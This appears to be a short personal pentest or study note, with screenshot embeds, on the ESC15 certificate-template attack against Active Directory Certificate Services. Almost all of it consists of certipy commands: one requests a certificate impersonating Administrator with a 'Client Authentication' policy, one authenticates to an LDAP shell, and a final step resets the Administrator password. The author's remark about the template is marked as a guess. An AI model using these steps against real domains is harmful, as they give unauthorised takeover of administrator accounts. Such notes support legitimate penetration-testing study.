- certipy req -dc-ip <IP> -ca <CA> -target-ip <IP> -u <user@domain> -p <password> -template <template> -upn Administrator.pfx@<domain> -application-policies ‘Client Authentication’
    
    - template might always be WebServer but I’m not sure
    
![[../../assets/ESC15/image 415.png|image 415.png]]
  
with the administrator.pfx, authenticate to an LDAP shell
- certipy auth -pfx administrator.pfx -dc-ip <IP> -ldap-shell
![[../../assets/ESC15/image 1 310.png|image 1 310.png]]
  
  
from here, you can change the administrator password
- change_password Administrator <password>
![[../../assets/ESC15/image 2 261.png|image 2 261.png]]